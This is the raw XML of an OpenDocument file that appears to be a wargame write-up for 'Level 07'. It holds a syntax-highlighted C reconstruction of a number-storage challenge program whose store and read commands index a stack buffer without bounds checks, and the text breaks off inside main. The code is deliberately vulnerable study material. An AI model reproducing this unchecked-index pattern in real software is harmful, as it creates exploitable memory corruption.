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2A0000110FB2019D01.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/20000007000019390000073DA5F6216A.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/200000070000319D00001A41AAC87220.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/2000000700002DFF000026F893B553FB.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/200000070000297300001A41D6DFDFF4.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/200000070000455B000012EB93E260F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d0d0d0"/>
    </style:style>
    <style:style style:name="P6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7" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:background-color="#1c1c1c">
        <style:background-image/>
      </style:paragraph-properties>
      <style:text-properties fo:color="#cd2828" fo:font-style="normal" fo:font-weight="bold" style:font-style-asian="normal" style:font-style-complex="normal"/>
    </style:style>
    <style:style style:name="P8" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:line-height="125%" fo:background-color="#1c1c1c">
        <style:background-image/>
      </style:paragraph-properties>
      <style:text-properties fo:color="#cd2828" fo:font-weight="bold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0" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:line-height="125%" fo:background-color="#1c1c1c">
        <style:background-image/>
      </style:paragraph-properties>
      <style:text-properties fo:color="#d0d0d0"/>
    </style:style>
    <style:style style:name="P11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font-style-asian="normal" style:font-style-complex="normal"/>
    </style:style>
    <style:style style:name="P12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style:font-style-asian="normal" style:font-style-complex="normal"/>
    </style:style>
    <style:style style:name="P13" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:line-height="125%" fo:background-color="#1c1c1c">
        <style:background-image/>
      </style:paragraph-properties>
      <style:text-properties fo:color="#999999" fo:font-style="italic"/>
    </style:style>
    <style:style style:name="T1" style:family="text">
      <style:text-properties fo:color="#6ab825" fo:font-weight="bold"/>
    </style:style>
    <style:style style:name="T2" style:family="text">
      <style:text-properties fo:color="#6ab825" fo:font-weight="bol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447fcf"/>
    </style:style>
    <style:style style:name="T5" style:family="text">
      <style:text-properties fo:color="#447fcf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d0d0d0"/>
    </style:style>
    <style:style style:name="T7" style:family="text">
      <style:text-properties fo:color="#d0d0d0" fo:font-weight="normal" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T8" style:family="text">
      <style:text-properties fo:color="#3677a9"/>
    </style:style>
    <style:style style:name="T9" style:family="text">
      <style:text-properties fo:color="#ed9d13"/>
    </style:style>
    <style:style style:name="T10" style:family="text">
      <style:text-properties fo:color="#999999" fo:font-style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24909d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9659680850901590" text:style-name="L1">
        <text:list-item>
          <text:p text:style-name="P1">Level 07</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P7">#include &lt;stdio.h&gt;</text:p>
      <text:p text:style-name="P8">#include &lt;unistd.h&gt;</text:p>
      <text:p text:style-name="P8">#include &lt;stdlib.h&gt;</text:p>
      <text:p text:style-name="P8">#include &lt;string.h&gt;</text:p>
      <text:p text:style-name="P8">#include &lt;stdint.h&gt;</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"><text:span text:style-name="T1">void</text:span> <text:s text:c="7"/><text:span text:style-name="T4">clear_stdin</text:span><text:span text:style-name="T6">(</text:span><text:span text:style-name="T1">void</text:span><text:span text:style-name="T6">)</text:span></text:p>
      <text:p text:style-name="P10">{</text:p>
      <text:p text:style-name="P9"><text:s text:c="4"/><text:span text:style-name="T1">int</text:span> <text:s text:c="3"/><text:span text:style-name="T6">tmp;</text:span></text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"><text:s text:c="4"/><text:span text:style-name="T6">tmp</text:span> <text:span text:style-name="T6">=</text:span> <text:span text:style-name="T6">getchar();</text:span></text:p>
      <text:p text:style-name="P9"><text:s text:c="4"/><text:span text:style-name="T1">while</text:span> <text:span text:style-name="T6">((</text:span><text:span text:style-name="T1">char</text:span><text:span text:style-name="T6">)tmp</text:span> <text:span text:style-name="T6">!=</text:span> <text:span text:style-name="T6">-</text:span><text:span text:style-name="T8">1</text:span><text:span text:style-name="T6">)</text:span></text:p>
      <text:p text:style-name="P9"><text:s text:c="4"/><text:span text:style-name="T6">{</text:span></text:p>
      <text:p text:style-name="P9"><text:s text:c="8"/><text:span text:style-name="T1">if</text:span> <text:span text:style-name="T6">((</text:span><text:span text:style-name="T1">char</text:span><text:span text:style-name="T6">)tmp</text:span> <text:span text:style-name="T6">==</text:span> <text:span text:style-name="T9">'\n'</text:span><text:span text:style-name="T6">)</text:span></text:p>
      <text:p text:style-name="P9"><text:s text:c="12"/><text:span text:style-name="T1">return</text:span> <text:span text:style-name="T6">;</text:span></text:p>
      <text:p text:style-name="P9"><text:s text:c="4"/><text:span text:style-name="T6">}</text:span></text:p>
      <text:p text:style-name="P9"><text:s text:c="4"/><text:span text:style-name="T1">return</text:span> <text:span text:style-name="T6">;</text:span></text:p>
      <text:p text:style-name="P10">}</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"><text:span text:style-name="T1">unsigned</text:span> <text:span text:style-name="T1">int</text:span> <text:s text:c="3"/><text:span text:style-name="T4">get_unum</text:span><text:span text:style-name="T6">(</text:span><text:span text:style-name="T1">void</text:span><text:span text:style-name="T6">)</text:span></text:p>
      <text:p text:style-name="P10">{</text:p>
      <text:p text:style-name="P9"><text:s text:c="4"/><text:span text:style-name="T1">unsigned</text:span> <text:span text:style-name="T1">int</text:span> <text:span text:style-name="T6">result</text:span> <text:span text:style-name="T6">=</text:span> <text:span text:style-name="T8">0</text:span><text:span text:style-name="T6">;</text:span></text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"><text:s text:c="4"/><text:span text:style-name="T6">fflush(stdout);</text:span></text:p>
      <text:p text:style-name="P9"><text:s text:c="4"/><text:span text:style-name="T6">scanf(</text:span><text:span text:style-name="T9">"%u"</text:span><text:span text:style-name="T6">,</text:span> <text:span text:style-name="T6">&amp;result);</text:span></text:p>
      <text:p text:style-name="P9"><text:s text:c="4"/><text:span text:style-name="T6">clear_stdin();</text:span></text:p>
      <text:p text:style-name="P9"><text:s text:c="4"/><text:span text:style-name="T1">return</text:span> <text:span text:style-name="T6">(result);</text:span></text:p>
      <text:p text:style-name="P10">}</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"><text:span text:style-name="T1">int</text:span> <text:s text:c="3"/><text:span text:style-name="T4">store_number</text:span><text:span text:style-name="T6">(</text:span><text:span text:style-name="T1">char</text:span> <text:span text:style-name="T6">*buff)</text:span></text:p>
      <text:p text:style-name="P10">{</text:p>
      <text:p text:style-name="P9"><text:s text:c="4"/><text:span text:style-name="T1">unsigned</text:span> <text:span text:style-name="T1">int</text:span> <text:s text:c="3"/><text:span text:style-name="T6">n<text:tab/>=</text:span> <text:span text:style-name="T8">0x0</text:span><text:span text:style-name="T6">;<text:tab/><text:tab/><text:tab/></text:span><text:span text:style-name="T10">// [ebp-0x10]</text:span></text:p>
      <text:p text:style-name="P9"><text:s text:c="4"/><text:span text:style-name="T1">unsigned</text:span> <text:span text:style-name="T1">int</text:span> <text:s text:c="3"/><text:span text:style-name="T6">n2<text:tab/>=</text:span> <text:span text:style-name="T8">0x0</text:span><text:span text:style-name="T6">;<text:tab/><text:tab/><text:tab/></text:span><text:span text:style-name="T10">// [ebp-0xc]</text:span></text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"><text:s text:c="4"/><text:span text:style-name="T6">printf(</text:span><text:span text:style-name="T9">" Number: "</text:span><text:span text:style-name="T6">);</text:span></text:p>
      <text:p text:style-name="P9"><text:s text:c="4"/><text:span text:style-name="T6">n</text:span> <text:span text:style-name="T6">=</text:span> <text:span text:style-name="T6">get_unum();</text:span></text:p>
      <text:p text:style-name="P9"><text:s text:c="4"/><text:span text:style-name="T6">printf(</text:span><text:span text:style-name="T9">" Index: "</text:span><text:span text:style-name="T6">);</text:span></text:p>
      <text:p text:style-name="P9"><text:s text:c="4"/><text:span text:style-name="T6">n2</text:span> <text:span text:style-name="T6">=</text:span> <text:span text:style-name="T6">get_unum();</text:span></text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"><text:s text:c="4"/><text:span text:style-name="T1">unsigned</text:span> <text:span text:style-name="T1">int</text:span> <text:span text:style-name="T6">tmp_1</text:span> <text:span text:style-name="T6">=</text:span> <text:span text:style-name="T6">((</text:span><text:span text:style-name="T1">uint64_t</text:span><text:span text:style-name="T6">)n2</text:span> <text:span text:style-name="T6">*</text:span> <text:span text:style-name="T8">0xaaaaaaab</text:span><text:span text:style-name="T6">)</text:span> <text:span text:style-name="T6">&gt;&gt;</text:span> <text:span text:style-name="T8">32</text:span><text:span text:style-name="T6">;</text:span></text:p>
      <text:p text:style-name="P9"><text:s text:c="4"/><text:span text:style-name="T6">tmp_1</text:span> <text:span text:style-name="T6">=</text:span> <text:span text:style-name="T6">tmp_1</text:span> <text:span text:style-name="T6">&gt;&gt;</text:span> <text:span text:style-name="T8">1</text:span><text:span text:style-name="T6">;</text:span></text:p>
      <text:p text:style-name="P9"><text:s text:c="4"/><text:span text:style-name="T1">unsigned</text:span> <text:span text:style-name="T1">int</text:span> <text:span text:style-name="T6">tmp_2</text:span> <text:span text:style-name="T6">=</text:span> <text:span text:style-name="T6">tmp_1</text:span> <text:span text:style-name="T6">+</text:span> <text:span text:style-name="T6">tmp_1;</text:span></text:p>
      <text:p text:style-name="P9"><text:s text:c="4"/><text:span text:style-name="T6">tmp_2</text:span> <text:span text:style-name="T6">+=</text:span> <text:span text:style-name="T6">tmp_1;</text:span></text:p>
      <text:p text:style-name="P9"><text:s text:c="4"/><text:span text:style-name="T1">unsigned</text:span> <text:span text:style-name="T1">int</text:span> <text:span text:style-name="T6">tmp_3</text:span> <text:span text:style-name="T6">=</text:span> <text:span text:style-name="T6">n2</text:span> <text:span text:style-name="T6">-</text:span> <text:span text:style-name="T6">tmp_2;</text:span></text:p>
      <text:p text:style-name="P9"><text:s text:c="4"/><text:span text:style-name="T10">// Equivalent to : tmp_3 = n2 % 3</text:span></text:p>
      <text:p text:style-name="P9"><text:s text:c="4"/><text:span text:style-name="T1">if</text:span> <text:span text:style-name="T6">(tmp_3</text:span> <text:span text:style-name="T6">==</text:span> <text:span text:style-name="T8">0</text:span> <text:span text:style-name="T6">||</text:span> <text:span text:style-name="T6">(n</text:span> <text:span text:style-name="T6">&gt;&gt;</text:span> <text:span text:style-name="T8">24</text:span><text:span text:style-name="T6">)</text:span> <text:span text:style-name="T6">==</text:span> <text:span text:style-name="T8">0xb7</text:span><text:span text:style-name="T6">)</text:span></text:p>
      <text:p text:style-name="P9"><text:s text:c="4"/><text:span text:style-name="T6">{</text:span></text:p>
      <text:p text:style-name="P9"><text:s text:c="8"/><text:span text:style-name="T6">puts(</text:span><text:span text:style-name="T9">" *** ERROR! ***"</text:span><text:span text:style-name="T6">);</text:span></text:p>
      <text:p text:style-name="P9"><text:s text:c="8"/><text:span text:style-name="T6">puts(</text:span><text:span text:style-name="T9">" <text:s text:c="2"/>This index is reserved for wil!"</text:span><text:span text:style-name="T6">);</text:span></text:p>
      <text:p text:style-name="P9"><text:soft-page-break/><text:s text:c="8"/><text:span text:style-name="T6">puts(</text:span><text:span text:style-name="T9">" *** ERROR! ***"</text:span><text:span text:style-name="T6">);</text:span></text:p>
      <text:p text:style-name="P9"><text:s text:c="8"/><text:span text:style-name="T1">return</text:span> <text:span text:style-name="T6">(</text:span><text:span text:style-name="T8">1</text:span><text:span text:style-name="T6">);</text:span></text:p>
      <text:p text:style-name="P9"><text:s text:c="4"/><text:span text:style-name="T6">}</text:span></text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"><text:s text:c="4"/><text:span text:style-name="T6">buff[n2</text:span> <text:span text:style-name="T6">*</text:span> <text:span text:style-name="T8">4</text:span><text:span text:style-name="T6">]</text:span> <text:span text:style-name="T6">=</text:span> <text:span text:style-name="T6">n;</text:span></text:p>
      <text:p text:style-name="P9"><text:s text:c="4"/><text:span text:style-name="T1">return</text:span> <text:span text:style-name="T6">(</text:span><text:span text:style-name="T8">0</text:span><text:span text:style-name="T6">);</text:span></text:p>
      <text:p text:style-name="P10">}</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"><text:span text:style-name="T1">int</text:span> <text:s text:c="3"/><text:span text:style-name="T4">read_number</text:span><text:span text:style-name="T6">(</text:span><text:span text:style-name="T1">char</text:span> <text:span text:style-name="T6">*buff)</text:span></text:p>
      <text:p text:style-name="P10">{</text:p>
      <text:p text:style-name="P9"><text:s text:c="4"/><text:span text:style-name="T1">unsigned</text:span> <text:span text:style-name="T1">int</text:span> <text:s text:c="3"/><text:span text:style-name="T6">index</text:span> <text:span text:style-name="T6">=</text:span> <text:span text:style-name="T8">0x0</text:span><text:span text:style-name="T6">;<text:tab/><text:tab/><text:tab/></text:span><text:span text:style-name="T10">// [ebp-0xc]</text:span></text:p>
      <text:p text:style-name="P9"><text:s text:c="4"/><text:span text:style-name="T6">printf(</text:span><text:span text:style-name="T9">" Index: "</text:span><text:span text:style-name="T6">);</text:span></text:p>
      <text:p text:style-name="P9"><text:s text:c="4"/><text:span text:style-name="T6">index</text:span> <text:span text:style-name="T6">=</text:span> <text:span text:style-name="T6">get_unum();</text:span></text:p>
      <text:p text:style-name="P9"><text:s text:c="4"/><text:span text:style-name="T6">printf(</text:span><text:span text:style-name="T9">" Number at data[%u] is %u\n"</text:span><text:span text:style-name="T6">,</text:span> <text:span text:style-name="T6">index,</text:span> <text:span text:style-name="T6">buff[index</text:span> <text:span text:style-name="T6">*</text:span> <text:span text:style-name="T8">4</text:span><text:span text:style-name="T6">]);</text:span></text:p>
      <text:p text:style-name="P9"><text:s text:c="4"/><text:span text:style-name="T1">return</text:span> <text:span text:style-name="T6">(</text:span><text:span text:style-name="T8">0</text:span><text:span text:style-name="T6">);</text:span></text:p>
      <text:p text:style-name="P10">}</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"><text:span text:style-name="T1">int</text:span> <text:s text:c="3"/><text:span text:style-name="T4">main</text:span><text:span text:style-name="T6">(</text:span><text:span text:style-name="T1">int</text:span> <text:span text:style-name="T6">argc,</text:span> <text:span text:style-name="T1">char</text:span> <text:span text:style-name="T6">**argv)</text:span></text:p>
      <text:p text:style-name="P10">{</text:p>
      <text:p text:style-name="P9"><text:s text:c="4"/><text:span text:style-name="T1">char<text:tab/><text:tab/></text:span><text:span text:style-name="T6">**av<text:tab/><text:tab/>=</text:span> <text:span text:style-name="T6">argv;<text:tab/><text:tab/><text:tab/></text:span><text:span text:style-name="T10">// [esp+0x1c]</text:span></text:p>
      <text:p text:style-name="P9"><text:s text:c="4"/><text:span text:style-name="T1">char<text:tab/><text:tab/></text:span><text:span text:style-name="T6">**av_4<text:tab/>=</text:span> <text:span text:style-name="T6">argv</text:span> <text:span text:style-name="T6">+</text:span> <text:span text:style-name="T8">0x4</text:span><text:span text:style-name="T6">;<text:tab/><text:tab/></text:span><text:span text:style-name="T10">// [esp+0x18]</text:span></text:p>
      <text:p text:style-name="P9"><text:s text:c="4"/><text:span text:style-name="T1">unsigned</text:span> <text:span text:style-name="T1">int<text:tab/></text:span><text:span text:style-name="T6">n<text:tab/><text:tab/>=</text:span> <text:span text:style-name="T8">0x14</text:span><text:span text:style-name="T6">;<text:tab/><text:tab/><text:tab/></text:span><text:span text:style-name="T10">// [esp+0x1cc]</text:span></text:p>
      <text:p text:style-name="P9"><text:s text:c="4"/><text:span text:style-name="T1">unsigned</text:span> <text:span text:style-name="T1">int<text:tab/></text:span><text:span text:style-name="T6">v1<text:tab/><text:tab/>=</text:span> <text:span text:style-name="T8">0x0</text:span><text:span text:style-name="T6">;<text:tab/><text:tab/><text:tab/></text:span><text:span text:style-name="T10">// [esp+0x1b4]</text:span></text:p>
      <text:p text:style-name="P9"><text:s text:c="4"/><text:span text:style-name="T1">char<text:tab/><text:tab/></text:span><text:span text:style-name="T6">cmd[</text:span><text:span text:style-name="T8">20</text:span><text:span text:style-name="T6">];<text:tab/><text:tab/><text:tab/><text:tab/><text:tab/></text:span><text:span text:style-name="T10">// [esp+0x1b8]</text:span></text:p>
      <text:p text:style-name="P9"><text:s text:c="4"/><text:span text:style-name="T1">char<text:tab/><text:tab/></text:span><text:span text:style-name="T6">buff[</text:span><text:span text:style-name="T8">100</text:span><text:span text:style-name="T6">];<text:tab/><text:tab/><text:tab/><text:tab/><text:tab/></text:span><text:span text:style-name="T10">// [esp+0x24]</text:span></text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"><text:s text:c="4"/><text:span text:style-name="T1">for</text:span> <text:span text:style-name="T6">(</text:span><text:span text:style-name="T1">int</text:span> <text:span text:style-name="T6">i</text:span> <text:span text:style-name="T6">=</text:span> <text:span text:style-name="T8">0</text:span><text:span text:style-name="T6">;</text:span> <text:span text:style-name="T6">i</text:span> <text:span text:style-name="T6">&lt;</text:span> <text:span text:style-name="T8">100</text:span><text:span text:style-name="T6">;</text:span> <text:span text:style-name="T6">i++)</text:span></text:p>
      <text:p text:style-name="P9"><text:s text:c="8"/><text:span text:style-name="T6">buff[i]</text:span> <text:span text:style-name="T6">=</text:span> <text:span text:style-name="T8">0</text:span><text:span text:style-name="T6">;</text:span></text:p>
      <text:p text:style-name="P9"><text:s text:c="4"/><text:span text:style-name="T1">for</text:span> <text:span text:style-name="T6">(</text:span><text:span text:style-name="T1">int</text:span> <text:span text:style-name="T6">i</text:span> <text:span text:style-name="T6">=</text:span> <text:span text:style-name="T8">0</text:span><text:span text:style-name="T6">;</text:span> <text:span text:style-name="T6">i</text:span> <text:span text:style-name="T6">&lt;</text:span> <text:span text:style-name="T8">20</text:span><text:span text:style-name="T6">;</text:span> <text:span text:style-name="T6">i++)</text:span></text:p>
      <text:p text:style-name="P9"><text:s text:c="8"/><text:span text:style-name="T6">cmd[i]</text:span> <text:span text:style-name="T6">=</text:span> <text:span text:style-name="T8">0</text:span><text:span text:style-name="T6">;</text:span></text:p>
      <text:p text:style-name="P9"><text:s text:c="4"/></text:p>
      <text:p text:style-name="P9"><text:s text:c="4"/><text:span text:style-name="T1">while</text:span> <text:span text:style-name="T6">(*av</text:span> <text:span text:style-name="T6">!=</text:span> <text:span text:style-name="T8">0</text:span><text:span text:style-name="T6">)</text:span></text:p>
      <text:p text:style-name="P9"><text:s text:c="4"/><text:span text:style-name="T6">{</text:span></text:p>
      <text:p text:style-name="P9"><text:s text:c="8"/><text:span text:style-name="T1">int</text:span> <text:span text:style-name="T6">len</text:span> <text:span text:style-name="T6">=</text:span> <text:span text:style-name="T8">0</text:span><text:span text:style-name="T6">;</text:span></text:p>
      <text:p text:style-name="P9"><text:s text:c="8"/><text:span text:style-name="T1">while</text:span> <text:span text:style-name="T6">(av[</text:span><text:span text:style-name="T8">0</text:span><text:span text:style-name="T6">][len]</text:span> <text:span text:style-name="T6">!=</text:span> <text:span text:style-name="T8">0</text:span><text:span text:style-name="T6">)</text:span></text:p>
      <text:p text:style-name="P9"><text:s text:c="12"/><text:span text:style-name="T6">len++;</text:span></text:p>
      <text:p text:style-name="P9"><text:s text:c="8"/><text:span text:style-name="T6">memset(av[</text:span><text:span text:style-name="T8">0</text:span><text:span text:style-name="T6">],</text:span> <text:span text:style-name="T8">0</text:span><text:span text:style-name="T6">,</text:span> <text:span text:style-name="T6">len);</text:span></text:p>
      <text:p text:style-name="P9"><text:s text:c="8"/><text:span text:style-name="T6">av++;</text:span></text:p>
      <text:p text:style-name="P9"><text:s text:c="4"/><text:span text:style-name="T6">}</text:span></text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"><text:s text:c="4"/><text:span text:style-name="T1">while</text:span> <text:span text:style-name="T6">(*av_4</text:span> <text:span text:style-name="T6">!=</text:span> <text:span text:style-name="T8">0</text:span><text:span text:style-name="T6">)</text:span></text:p>
      <text:p text:style-name="P9"><text:s text:c="4"/><text:span text:style-name="T6">{</text:span></text:p>
      <text:p text:style-name="P9"><text:s text:c="8"/><text:span text:style-name="T1">int</text:span> <text:span text:style-name="T6">len</text:span> <text:span text:style-name="T6">=</text:span> <text:span text:style-name="T8">0</text:span><text:span text:style-name="T6">;</text:span></text:p>
      <text:p text:style-name="P9"><text:s text:c="8"/><text:span text:style-name="T1">while</text:span> <text:span text:style-name="T6">(av_4[</text:span><text:span text:style-name="T8">0</text:span><text:span text:style-name="T6">][len]</text:span> <text:span text:style-name="T6">!=</text:span> <text:span text:style-name="T8">0</text:span><text:span text:style-name="T6">)</text:span></text:p>
      <text:p text:style-name="P9"><text:s text:c="12"/><text:span text:style-name="T6">len++;</text:span></text:p>
      <text:p text:style-name="P9"><text:s text:c="8"/><text:span text:style-name="T6">memset(av_4[</text:span><text:span text:style-name="T8">0</text:span><text:span text:style-name="T6">],</text:span> <text:span text:style-name="T8">0</text:span><text:span text:style-name="T6">,</text:span> <text:span text:style-name="T6">len);</text:span></text:p>
      <text:p text:style-name="P9"><text:s text:c="8"/><text:span text:style-name="T6">av_4++;</text:span></text:p>
      <text:p text:style-name="P9"><text:s text:c="4"/><text:span text:style-name="T6">}</text:span></text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"><text:s text:c="4"/><text:span text:style-name="T6">puts(</text:span><text:span text:style-name="T9">"----------------------------------------------------\n Welcome to wil's crappy number storage service! </text:span><text:soft-page-break/><text:span text:style-name="T9">\n----------------------------------------------------\n Commands: <text:s text:c="41"/>\n store - store a number into the data storage <text:s text:c="3"/>\n <text:s text:c="3"/>read <text:s/>- read a number from the data storage <text:s text:c="4"/>\n <text:s text:c="3"/>quit <text:s/>- exit the program <text:s text:c="23"/>\n----------------------------------------------------\n wil has reserved some storage :&gt; <text:s text:c="16"/>\n----------------------------------------------------\n"</text:span><text:span text:style-name="T6">);</text:span></text:p>
      <text:p text:style-name="P9"><text:s text:c="4"/></text:p>
      <text:p text:style-name="P9"><text:s text:c="4"/><text:span text:style-name="T1">while</text:span> <text:span text:style-name="T6">(</text:span><text:span text:style-name="T8">1</text:span><text:span text:style-name="T6">)</text:span></text:p>
      <text:p text:style-name="P9"><text:s text:c="4"/><text:span text:style-name="T6">{</text:span></text:p>
      <text:p text:style-name="P9"><text:s text:c="8"/><text:span text:style-name="T6">printf(</text:span><text:span text:style-name="T9">"Input command: "</text:span><text:span text:style-name="T6">);</text:span></text:p>
      <text:p text:style-name="P9"><text:s text:c="8"/><text:span text:style-name="T6">v1</text:span> <text:span text:style-name="T6">=</text:span> <text:span text:style-name="T8">0x1</text:span><text:span text:style-name="T6">;</text:span></text:p>
      <text:p text:style-name="P9"><text:s text:c="8"/><text:span text:style-name="T6">fgets(cmd,</text:span> <text:span text:style-name="T8">20</text:span><text:span text:style-name="T6">,</text:span> <text:span text:style-name="T6">stdin);</text:span></text:p>
      <text:p text:style-name="P9"><text:s text:c="4"/></text:p>
      <text:p text:style-name="P9"><text:s text:c="8"/><text:span text:style-name="T1">int</text:span> <text:span text:style-name="T6">size</text:span> <text:span text:style-name="T6">=</text:span> <text:span text:style-name="T8">0</text:span><text:span text:style-name="T6">;</text:span></text:p>
      <text:p text:style-name="P9"><text:s text:c="8"/><text:span text:style-name="T1">while</text:span> <text:span text:style-name="T6">(cmd[size+</text:span><text:span text:style-name="T8">1</text:span><text:span text:style-name="T6">])</text:span></text:p>
      <text:p text:style-name="P9"><text:s text:c="12"/><text:span text:style-name="T6">size++;</text:span></text:p>
      <text:p text:style-name="P9"><text:s text:c="8"/><text:span text:style-name="T6">cmd[size]</text:span> <text:span text:style-name="T6">=</text:span> <text:span text:style-name="T9">'\0'</text:span><text:span text:style-name="T6">;</text:span></text:p>
      <text:p text:style-name="P9"><text:s text:c="4"/></text:p>
      <text:p text:style-name="P9"><text:s text:c="8"/><text:span text:style-name="T1">int</text:span> <text:span text:style-name="T6">i</text:span> <text:span text:style-name="T6">=</text:span> <text:span text:style-name="T8">0</text:span><text:span text:style-name="T6">;</text:span></text:p>
      <text:p text:style-name="P9"><text:s text:c="8"/><text:span text:style-name="T1">char</text:span> <text:span text:style-name="T6">*store</text:span> <text:span text:style-name="T6">=</text:span> <text:span text:style-name="T9">"store"</text:span><text:span text:style-name="T6">;</text:span></text:p>
      <text:p text:style-name="P9"><text:s text:c="8"/><text:span text:style-name="T1">while</text:span> <text:span text:style-name="T6">(i</text:span> <text:span text:style-name="T6">&lt;</text:span> <text:span text:style-name="T8">5</text:span> <text:span text:style-name="T6">&amp;&amp;</text:span> <text:span text:style-name="T6">cmd[i]</text:span> <text:span text:style-name="T6">==</text:span> <text:span text:style-name="T6">store[i])</text:span></text:p>
      <text:p text:style-name="P9"><text:s text:c="12"/><text:span text:style-name="T6">i++;</text:span></text:p>
      <text:p text:style-name="P9"><text:s text:c="8"/><text:span text:style-name="T1">if</text:span> <text:span text:style-name="T6">(i</text:span> <text:span text:style-name="T6">==</text:span> <text:span text:style-name="T8">5</text:span><text:span text:style-name="T6">)</text:span></text:p>
      <text:p text:style-name="P9"><text:s text:c="12"/><text:span text:style-name="T6">v1</text:span> <text:span text:style-name="T6">=</text:span> <text:span text:style-name="T6">store_number(buff);</text:span></text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"><text:s text:c="8"/><text:span text:style-name="T6">i</text:span> <text:span text:style-name="T6">=</text:span> <text:span text:style-name="T8">0</text:span><text:span text:style-name="T6">;</text:span></text:p>
      <text:p text:style-name="P9"><text:s text:c="8"/><text:span text:style-name="T1">char</text:span> <text:span text:style-name="T6">*read</text:span> <text:span text:style-name="T6">=</text:span> <text:span text:style-name="T9">"read"</text:span><text:span text:style-name="T6">;</text:span></text:p>
      <text:p text:style-name="P9"><text:s text:c="8"/><text:span text:style-name="T1">while</text:span> <text:span text:style-name="T6">(i</text:span> <text:span text:style-name="T6">&lt;</text:span> <text:span text:style-name="T8">4</text:span> <text:span text:style-name="T6">&amp;&amp;</text:span> <text:span text:style-name="T6">cmd[i]</text:span> <text:span text:style-name="T6">==</text:span> <text:span text:style-name="T6">read[i])</text:span></text:p>
      <text:p text:style-name="P9"><text:s text:c="12"/><text:span text:style-name="T6">i++;</text:span></text:p>
      <text:p text:style-name="P9"><text:s text:c="8"/><text:span text:style-name="T1">if</text:span> <text:span text:style-name="T6">(i</text:span> <text:span text:style-name="T6">==</text:span> <text:span text:style-name="T8">4</text:span><text:span text:style-name="T6">)</text:span></text:p>
      <text:p text:style-name="P9"><text:s text:c="12"/><text:span text:style-name="T6">v1</text:span> <text:span text:style-name="T6">=</text:span> <text:span text:style-name="T6">read_number(buff);</text:span></text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"><text:s text:c="8"/><text:span text:style-name="T6">i</text:span> <text:span text:style-name="T6">=</text:span> <text:span text:style-name="T8">0</text:span><text:span text:style-name="T6">;</text:span></text:p>
      <text:p text:style-name="P9"><text:s text:c="8"/><text:span text:style-name="T1">char</text:span> <text:span text:style-name="T6">*quit</text:span> <text:span text:style-name="T6">=</text:span> <text:span text:style-name="T9">"quit"</text:span><text:span text:style-name="T6">;</text:span></text:p>
      <text:p text:style-name="P9"><text:s text:c="8"/><text:span text:style-name="T1">while</text:span> <text:span text:style-name="T6">(i</text:span> <text:span text:style-name="T6">&lt;</text:span> <text:span text:style-name="T8">4</text:span> <text:span text:style-name="T6">&amp;&amp;</text:span> <text:span text:style-name="T6">cmd[i]</text:span> <text:span text:style-name="T6">==</text:span> <text:span text:style-name="T6">quit[i])</text:span></text:p>
      <text:p text:style-name="P9"><text:s text:c="12"/><text:span text:style-name="T6">i++;</text:span></text:p>
      <text:p text:style-name="P9"><text:s text:c="8"/><text:span text:style-name="T1">if</text:span> <text:span text:style-name="T6">(i</text:span> <text:span text:style-name="T6">==</text:span> <text:span text:style-name="T8">4</text:span><text:span text:style-name="T6">)</text:span></text:p>
      <text:p text:style-name="P9"><text:s text:c="12"/><text:span text:style-name="T1">return</text:span> <text:span text:style-name="T6">(</text:span><text:span text:style-name="T8">0</text:span><text:span text:style-name="T6">);</text:span></text:p>
      <text:p text:style-name="P9"><text:s text:c="4"/></text:p>
      <text:p text:style-name="P9"><text:s text:c="8"/><text:span text:style-name="T1">if</text:span> <text:span text:style-name="T6">(v1</text:span> <text:span text:style-name="T6">!=</text:span> <text:span text:style-name="T8">0</text:span><text:span text:style-name="T6">)</text:span></text:p>
      <text:p text:style-name="P9"><text:s text:c="12"/><text:span text:style-name="T6">printf(</text:span><text:span text:style-name="T9">" Failed to do %s command\n"</text:span><text:span text:style-name="T6">,</text:span> <text:span text:style-name="T6">cmd);</text:span></text:p>
      <text:p text:style-name="P9"><text:s text:c="8"/><text:span text:style-name="T1">else</text:span></text:p>
      <text:p text:style-name="P9"><text:s text:c="12"/><text:span text:style-name="T6">printf(</text:span><text:span text:style-name="T9">" Completed %s command successfully\n"</text:span><text:span text:style-name="T6">,</text:span> <text:span text:style-name="T6">cmd);</text:span></text:p>
      <text:p text:style-name="P9"><text:s text:c="4"/></text:p>
      <text:p text:style-name="P9"><text:s text:c="8"/><text:span text:style-name="T1">for</text:span> <text:span text:style-name="T6">(</text:span><text:span text:style-name="T1">int</text:span> <text:span text:style-name="T6">i</text:span> <text:span text:style-name="T6">=</text:span> <text:span text:style-name="T8">0</text:span><text:span text:style-name="T6">;</text:span> <text:span text:style-name="T6">i</text:span> <text:span text:style-name="T6">&lt;</text:span> <text:span text:style-name="T8">20</text:span><text:span text:style-name="T6">;</text:span> <text:span text:style-name="T6">i++)</text:span></text:p>
